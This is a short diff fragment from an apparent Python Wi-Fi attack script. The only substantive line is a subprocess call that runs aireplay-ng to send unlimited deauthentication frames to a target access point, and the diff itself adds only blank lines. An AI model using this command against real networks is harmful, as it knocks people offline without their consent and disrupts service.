@@ -198,3 +198,10 @@ try:
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
 except KeyboardInterrupt:
     print("Done!")
+    
+    
+    
+    
+    
+    
+ 
